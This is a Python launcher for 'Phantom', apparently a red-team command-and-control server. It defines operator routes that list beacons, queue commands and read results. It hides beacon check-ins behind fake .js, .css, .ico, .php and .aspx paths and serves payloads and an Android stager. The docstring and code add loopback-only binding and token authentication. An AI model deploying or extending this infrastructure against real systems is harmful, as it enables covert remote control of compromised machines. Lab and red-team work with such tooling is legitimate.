"""Run Phantom's C2 server standalone (development / lab launcher).

This is intentionally a thin wrapper around ``phantom.core.c2_server``: the
same beacon handlers, the same auth matrix, the same server-side token check.
It used to build its own ``aiohttp`` app with the operator routes
(``/api/v1/beacons``, ``/api/v1/queue``, ``/api/v1/results``) and no middleware
at all, so anything that could reach port 8080 could enumerate beacons, queue
tasks and read results.

Safety defaults:

* bind to ``127.0.0.1`` unless ``PHANTOM_C2_BIND`` explicitly asks otherwise;
* a non-loopback bind additionally requires
  ``PHANTOM_C2_ALLOW_REMOTE=1`` and is warned about (this launcher is HTTP);
* operator routes require ``X-Api-Token: <PHANTOM_API_TOKEN>`` through the
  server's own ``api_auth_middleware``;
* beacon routes keep their per-beacon HMAC authentication.

Use ``python _run_c2.py`` from the project root. Importing this module does not
start a listener; ``build_app()`` is exposed for tests.
"""

import asyncio
import json
import os
import sys
from typing import Any

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

from aiohttp import web

import phantom.core.c2_server as srv


DEFAULT_PORT = 8080
_LOOPBACK_HOSTS = {"127.0.0.1", "::1", "localhost"}


def _bind_host() -> str:
    """Where this launcher listens; loopback unless the operator opts out."""
    host = os.getenv("PHANTOM_C2_BIND", "127.0.0.1").strip() or "127.0.0.1"
    if host in _LOOPBACK_HOSTS:
        return host
    if os.getenv("PHANTOM_C2_ALLOW_REMOTE", "") != "1":
        raise SystemExit(
            f"refusing to bind the standalone C2 to {host!r}: set "
            "PHANTOM_C2_ALLOW_REMOTE=1 to acknowledge that this launcher "
            "speaks plaintext HTTP"
        )
    print(
        f"WARNING: standalone C2 listening on {host}:{DEFAULT_PORT} over "
        "plaintext HTTP; use TLS or a trusted tunnel for anything but a lab",
        flush=True,
    )
    return host


def _require_api_token() -> str:
    """Refuse to start an operator API that has no server-side token."""
    token = srv.get_api_token()
    if not token:
        raise SystemExit(
            "refusing to start the operator C2 API without an API token; "
            "run `python -m phantom.main --manual` once so the state file "
            "generates PHANTOM_API_TOKEN"
        )
    return token


async def handle_beacons(request: web.Request) -> web.Response:
    from phantom.core.c2_server import c2_state

    return web.Response(
        text=json.dumps(c2_state.get_beacons(), indent=2),
        content_type="application/json",
    )


async def handle_queue_task(request: web.Request) -> web.Response:
    from phantom.core.c2_server import c2_state

    try:
        body: Any = await request.json()
        beacon_id = str((body or {}).get("beacon_id", "") or "")
        command = str((body or {}).get("command", "") or "")
        if not beacon_id or not command:
            return web.Response(
                status=400,
                text='{"error":"beacon_id and command required"}',
                content_type="application/json",
            )
        c2_state.queue_task(beacon_id, command)
        return web.Response(
            text=json.dumps({"status": "queued"}),
            content_type="application/json",
        )
    except Exception as exc:
        return web.Response(
            status=400,
            text=json.dumps({"error": str(exc)}),
            content_type="application/json",
        )


async def handle_results(request: web.Request) -> web.Response:
    from phantom.core.c2_server import c2_state

    beacon_id = request.query.get("beacon_id", "")
    if not beacon_id:
        return web.Response(
            text=json.dumps({"error": "beacon_id required"}),
            content_type="application/json",
        )
    results = c2_state.get_results(beacon_id)
    return web.Response(
        text=json.dumps({"results": results}, indent=2),
        content_type="application/json",
    )


def build_app() -> web.Application:
    """Build the standalone app with the production auth middleware."""
    app = web.Application(
        client_max_size=50 * 1024 * 1024,
        middlewares=[
            srv.auth_matrix_middleware,
            srv.mtls_auth_middleware,
            srv.api_auth_middleware,
        ],
    )
    app.router.add_get("/api/v1/beacons", handle_beacons)
    app.router.add_post("/api/v1/queue", handle_queue_task)
    app.router.add_get("/api/v1/results", handle_results)
    app.router.add_get("/api/v1/ping", srv.handle_checkin)
    app.router.add_post("/api/v1/ping", srv.handle_checkin)
    app.router.add_get(r"/{path:.*\.js}", srv.handle_checkin)
    app.router.add_post(r"/{path:.*\.js}", srv.handle_checkin)
    app.router.add_get(r"/{path:.*\.css}", srv.handle_checkin)
    app.router.add_post(r"/{path:.*\.css}", srv.handle_checkin)
    app.router.add_get(r"/{path:.*\.ico}", srv.handle_checkin)
    app.router.add_post(r"/{path:.*\.ico}", srv.handle_checkin)
    app.router.add_post("/api/v1/result", srv.handle_result)
    app.router.add_post(r"/{path:.*\.php}", srv.handle_result)
    app.router.add_post(r"/{path:.*\.aspx}", srv.handle_result)
    app.router.add_get("/api/v1/payload", srv.handle_payload)
    app.router.add_get("/api/v1/payload_linux", srv.handle_payload)
    app.router.add_get("/api/v1/payload_linux_x86", srv.handle_payload)
    app.router.add_get("/api/v1/payload_macos", srv.handle_payload)
    app.router.add_get("/api/v1/payload_android", srv.handle_payload)
    app.router.add_get("/s/android", srv.handle_android_stager)
    app.router.add_get("/x", srv.handle_payload_pic)
    return app


def main() -> None:
    host = _bind_host()
    _require_api_token()
    print(f"READY http://{host}:{DEFAULT_PORT}", flush=True)
    web.run_app(build_app(), host=host, port=DEFAULT_PORT,
                print=lambda *args: None)


if __name__ == "__main__":
    main()
